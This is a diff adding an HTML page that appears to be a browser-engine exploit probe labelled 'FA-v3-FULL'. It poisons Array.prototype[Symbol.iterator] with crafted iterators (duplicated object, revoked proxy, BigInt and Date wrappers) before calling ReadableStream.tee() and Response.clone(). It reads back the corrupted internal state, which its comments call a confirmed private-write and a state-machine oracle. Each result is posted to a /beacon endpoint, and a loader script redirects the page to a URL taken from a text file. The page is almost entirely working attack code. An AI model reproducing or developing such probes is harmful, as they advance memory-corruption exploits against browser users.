@@ -1,0 +1,103 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v3-FULL — the WRAPPER-CLOSED chain: pidInverted + state-oracle full-scan + derive-runtime probe</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v3-FULL — state-machine oracle × all-clean variants
+</pre><script>
+(function(){
+ "use strict";
+ var run = "v3f" + Date.now().toString(36).slice(-18);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try{ fetch("/beacon/V3-"+st, { method:"POST", cache:"no-store",
+     headers:{"Content-Type":"application/json"},
+     body: JSON.stringify({r:run, b:String(body).slice(0,200)}) }).catch(function(e){}); }
+   catch(e){}
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function sameXTwice(){ var X={ ourTag:"v3full" }; window.__tgt = X;
+   return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:X, done:false}; } }; }; }
+ function proxyRevoked(){ var pr=Proxy.revocable({},{}); pr.revoke();
+   return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:pr.proxy, done:false}; } }; }; }
+ function bigintObj(){ var big=Object(0x14000000n);
+   return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:big, done:false}; } }; }; }
+ function dateObj(){ var d=new Date();
+   return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:d, done:false}; } }; }; }
+ function chainArr(){ var a=[]; for (var i=0;i<512;i++) a.push(Object(0x14000000n));
+   return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:a[511], done:false}; } }; }; }
+ function realStream(){ return function(){ var i=0,n=2;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:new ReadableStream({}), done:false}; } }; }; }
+ function revProxy(){ return proxyRevoked(); }
+ function ord(id, label, poison, work){
+   try{ beacon(id+"A", label); say("V3-"+id+" "+label);
+     try{ Array.prototype[Symbol.iterator]=poison(); }catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var r = work();
+     try{ Array.prototype[Symbol.iterator]=origIter; }catch(e2){}
+     beacon(id+"B", "SURV "+String(r).slice(0,200));
+   } catch(e){
+     try{ Array.prototype[Symbol.iterator]=origIter; }catch(e2){}
+     beacon(id+"E", "ETYPE: "+String(e).slice(0,180));
+   }
+ }
+ beacon("L","FA-v3-FULL loaded — deriveRuntime="+(typeof window.deriveRuntime));
+ // S0 control
+ ord("C0","clean control", function(){ return function(){ var i=0,n=2;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{plain:1}, done:false}; } }; }; },
+   function(){ var rs=new ReadableStream({}); var pair=rs.tee(); return "clean locked="+pair[0].locked; });
+ // S1 inversion — the 5x confirmed private-write on our object
+ ord("INV","pidInverted same-X", sameXTwice, function(){
+     var rs=new ReadableStream({}); var p=rs.tee(); var ft=false, st=false;
+     try{ p[0].cancel(); }catch(e){ ft=true; } try{ p[1].cancel(); }catch(e){ st=true; }
+     var tgt = window.__tgt;
+     return "pidInverted="+(ft&&!st?"true":"false")+"; locked="+p[0].locked+"; invKeys="+Object.keys(tgt).join(","); });
+ // S2 — state-machine ORACLE: readback locked/getReader/cancel on our object via the tee-confused pair
+ ord("ORA","state-machine oracle locked/getReaderc/cancel", sameXTwice, function(){
+     var rs=new ReadableStream({}); var p=rs.tee();
+     try{ p[0].getReader(); }catch(e){}
+     var locked = p[0].locked;
+     var grT = typeof p[0].getReader;
+     var crT = typeof p[0].cancel;
+     var stA = p[0].locked;
+     var clT = p[0] ? 2 : 0;
+     return "locked="+locked+"; gr="+grT+"; cr="+crT+"; second-locked="+stA; });
+ // S3 — the proxy-revoke wrapped state
+ ord("PX","revoked-proxy fake-stream", proxyRevoked, function(){
+     var rs=new ReadableStream({}); var p=rs.tee();
+     return "proxy-locked="+p[0].locked+"; gr="+(typeof p[0].getReader)+"; cl="+(typeof p[0].cancel); });
+ // S4 — bigint wrapped state
+ ord("BI","bigint-Object wrapped state", bigintObj, function(){
+     var rs=new ReadableStream({}); var p=rs.tee();
+     return "bigInt locked="+p[0].locked+"; gr="+(typeof p[0].getReader); });
+ // S5 — date wrapped
+ ord("DT","Date wrapped state", dateObj, function(){
+     var rs=new ReadableStream({}); var p=rs.tee();
+     return "date locked="+p[0].locked+"; typeof-cancel="+(typeof p[0].cancel); });
+ // S6 — the 512-chainArr deep wrapping
+ ord("CH","chainArr deep wrapped", chainArr, function(){
+     var rs=new ReadableStream({}); var p=rs.tee();
+     return "chainArr locked="+p[0].locked+"; typeof-cancel="+(typeof p[0].cancel); });
+ // S7 — real Stream record wrapped (sibling)
+ ord("RS","real-stream wrapped", realStream, function(){
+     var rs=new ReadableStream({}); var p=rs.tee();
+     var OTHER = new ReadableStream({});
+     var wrapv = new ReadableStream({}); var wp = wrapv.tee();
+     return "realStream locked="+wp[0].locked+"; gr="+(typeof wp[0].getReader); });
+ // S8 — revoked-proxy second shot
+ ord("RP","revoked-proxy 2nd", proxyRevoked, function(){
+     var rs=new ReadableStream({}); var p=rs.tee(); return "proxy2 locked="+p[0].locked; });
+ // S9 — the cross-subsystem Response.clone readback
+ ord("TL","Response.clone readback", sameXTwice, function(){
+     var rs=new ReadableStream({}); var p=rs.tee(); try{p[0].getReader();}catch(e){}
+     var resp = new Response(p[0]); var cl=resp.clone(); var bodyIs = !!cl.body;
+     var qr=""; try{ var gr = cl.body.getReader.call(cl.body); qr = typeof gr; }catch(e){qr="TypeError:"+String(e.message).slice(0,70);}
+     return "bodyIs="+bodyIs+"; readQr="+qr; });
+ // S10 — the full readback of the engine's private-write state on our OBJECT
+ ord("TGT","FINAL target readback", sameXTwice, function(){
+     var rs=new ReadableStream({}); var p=rs.tee();
+     var tgt = window.__tgt;
+     var keys = Object.keys(tgt).join(",");
+     var count = Object.keys(tgt).length;
+     return "tgt-keys="+keys+"; tgtCount="+count+"; locked="+p[0].locked; });
+ beacon("Z","FA-v3-FULL battery complete");
+ say("FA-v3-FULL battery complete");
+})();
+</script></body></html>
